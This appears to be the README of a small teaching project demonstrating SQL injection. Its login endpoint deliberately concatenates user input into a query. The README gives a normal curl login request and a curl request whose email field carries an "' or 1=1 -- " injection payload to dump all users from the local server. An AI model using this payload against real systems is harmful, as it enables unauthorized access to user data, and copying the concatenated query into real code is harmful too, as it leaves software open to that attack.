# About

Project presents a simple SQL Injection attack.
The developer instead of using a prepared statement, decided to concatenate
a string into a query, what can allow a user to perform unwanted operations 
on the database

# REST API

## Successful login

Upon successful login the endpoint returns the email and the ID of the user.

```
curl -X POST \
  http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{
	"email": "kamil@gmail.com",
	"password": "secretPassword"
}'
```

## SQL Injection to get all users

```
curl -X POST \
  http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{
	"email": "'\'' or 1=1 -- ",
	"password": ""
}'
```

